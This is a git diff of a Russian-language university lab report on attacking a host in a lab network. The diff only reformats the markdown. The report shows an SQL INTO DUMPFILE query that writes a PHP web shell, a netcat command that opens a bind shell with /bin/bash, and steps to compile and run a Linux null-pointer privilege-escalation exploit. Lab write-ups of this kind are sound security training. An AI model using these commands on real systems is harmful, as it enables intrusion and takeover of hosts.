@@ -1,4 +1,4 @@
-<img width="364" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/f1320945-7131-43f2-af96-60c88024da11"># Лабораторная работа №3
+# Лабораторная работа №3
 ## Исходные данные
 IP адрес злоумышленника: 192.168.56.101
 IP адрес атакуемого хоста: 192.168.36.102
@@ -18,10 +18,10 @@ SQL: `SELECT * INTO DUMPFILE "/usr/local/apache/htdocs/homepage/shell.php" 	FROM
 Netcat: `nc -l -v -p 1234 -e /bin/bash` <br /><br />
 <img width="423" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/4dfc5a78-6b9c-4a1d-b8b4-49630ee4cfb7">
 ## Повышение привилегий с помощью уязвимости Linux nullpointer exploit
-`gcc -o /tmp/run /usr/local/apache/htdocs/homepage/run.c
-gcc –o /tmp/exploit /usr/local/apache/htdocs/homepage/exploit.c
-cd /tmp 
-./run`<br /><br />
+`gcc -o /tmp/run /usr/local/apache/htdocs/homepage/run.c`<br /><br />
+`gcc –o /tmp/exploit /usr/local/apache/htdocs/homepage/exploit.c`<br /><br />
+`cd /tmp `<br /><br />
+`./run`<br /><br />
 <img width="438" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/08bb3e5f-6415-4d66-9de8-fc3b3b0e1d77"><br /><br />
 <img width="435" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/b640a111-358c-47a2-b51a-3c3807f4e770"><br /><br />
 <img width="433" alt="image" src="https://github.com/kirasir1/toib_prak/assets/13931629/2925ddfc-bb37-4a03-bd66-10081e439931">
